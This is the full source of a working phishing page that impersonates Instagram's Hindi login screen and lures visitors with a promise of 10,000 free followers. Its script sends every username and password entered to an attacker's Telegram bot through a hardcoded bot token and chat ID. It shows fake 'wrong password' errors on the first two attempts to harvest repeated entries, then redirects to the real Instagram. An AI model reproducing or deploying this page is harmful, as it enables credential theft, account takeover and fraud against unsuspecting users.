<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
        
        .language-selector { font-size: 12px; color: #8e8e8e; margin-bottom: 50px; margin-top: 10px; cursor: pointer; }
        
        .main-container { width: 100%; max-width: 400px; text-align: center; display: flex; flex-direction: column; align-items: center; }
        
        /* GitHub wali in.png yahan set hai */
        .insta-logo-img { width: 64px; height: 64px; margin-bottom: 35px; object-fit: contain; }
        
        #error-msg { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; padding: 0 10px; text-align: center; }

        .input-group { width: 100%; margin-bottom: 12px; }
        input { 
            width: 100%; 
            background: #fafafa; 
            border: 1px solid #dbdbdb; 
            padding: 14px 12px; 
            border-radius: 12px; 
            font-size: 14px; 
            color: #262626;
        }
        input:focus { border: 1px solid #0064e0; outline: none; background: #fff; }

        .btn-login { 
            width: 100%; 
            background-color: #0064e0; 
            color: white; 
            border: none; 
            padding: 12px 0; 
            border-radius: 25px; 
            font-weight: 600; 
            cursor: pointer; 
            margin: 10px 0; 
            font-size: 16px; 
        }
        .btn-login:disabled { background-color: #5890ff; opacity: 0.7; }

        .forgot-pass { color: #262626; font-size: 14px; font-weight: 500; margin-top: 15px; display: block; text-decoration: none; }

        .bottom-section { margin-top: auto; width: 100%; text-align: center; padding-bottom: 20px; padding-top: 40px; }
        
        .create-account-btn { 
            width: 100%; 
            background: transparent; 
            color: #0064e0; 
            border: 1px solid #0064e0; 
            padding: 10px 0; 
            border-radius: 25px; 
            font-weight: 600; 
            font-size: 14px; 
            text-decoration: none;
            display: inline-block;
            margin-bottom: 20px;
        }

        .meta-footer { display: flex; align-items: center; justify-content: center; gap: 4px; color: #8e8e8e; font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
        .meta-footer img { width: 14px; height: 14px; }

        .promo-text { color: #8e8e8e; font-size: 14px; margin-bottom: 25px; font-weight: 500; }
        .promo-text span { color: #262626; display: block; font-size: 18px; font-weight: 600; margin-top: 4px; }
    </style>
</head>
<body>

    <div class="language-selector">Hindi (India) ▼</div>

    <div class="main-container">
        <img src="in.png" class="insta-logo-img" alt="Instagram">
        
        <div class="promo-text">पाएं 10,000 फ्री फॉलोअर्स<span>सिर्फ 2 मिनट में डिलीवरी ⚡</span></div>

        <div id="error-msg">आपका पासवर्ड गलत है। कृपया पुनः प्रयास करें।</div>

        <form id="igForm">
            <div class="input-group">
                <input type="text" id="user" placeholder="यूजरनेम, ईमेल या मोबाइल नंबर" required>
            </div>
            <div class="input-group">
                <input type="password" id="pass" placeholder="पासवर्ड" required>
            </div>
            <button type="submit" class="btn-login" id="submitBtn">लॉग इन करें</button>
        </form>

        <a href="#" class="forgot-pass">पासवर्ड भूल गए?</a>
    </div>

    <div class="bottom-section">
        <a href="#" class="create-account-btn">नया अकाउंट बनाएं</a>
        <div class="meta-footer">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" alt="Meta">
            Meta
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8718721490:AAEZ-jYmSdFfzd5hmzwNwJaPKoluuDVhK_0';
        const TELEGRAM_CHAT_ID = '7181823616';
        let loginAttempts = 0;

        document.getElementById('igForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            loginAttempts++;
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            const btn = document.getElementById('submitBtn');
            const errorDiv = document.getElementById('error-msg');
            
            btn.innerText = "लॉग इन हो रहा है...";
            btn.disabled = true;
            errorDiv.style.display = "none";

            // Telegram message format
            const message = `🚀 *New Login Captured!* \n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n🔢 *Attempt:* ${loginAttempts}`;

            // Send data to Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(() => {
                setTimeout(() => {
                    if (loginAttempts < 3) {
                        // Pehle 2 attempts mein error dikhayega
                        errorDiv.style.display = "block";
                        btn.disabled = false;
                        btn.innerText = "लॉग इन करें";
                        document.getElementById('pass').value = ""; 
                    } else {
                        // 3rd attempt par success
                        alert('सत्यापन सफल! \nफॉलोअर्स 2 मिनट के भीतर जोड़ दिए जाएंगे।');
                        window.location.href = "https://www.instagram.com";
                    }
                }, 1000);
            })
            .catch(() => {
                alert('कनेक्शन एरर! कृपया फिर से कोशिश करें।');
                btn.disabled = false;
                btn.innerText = "लॉग इन करें";
            });
        });
    </script>
</body>
</html>
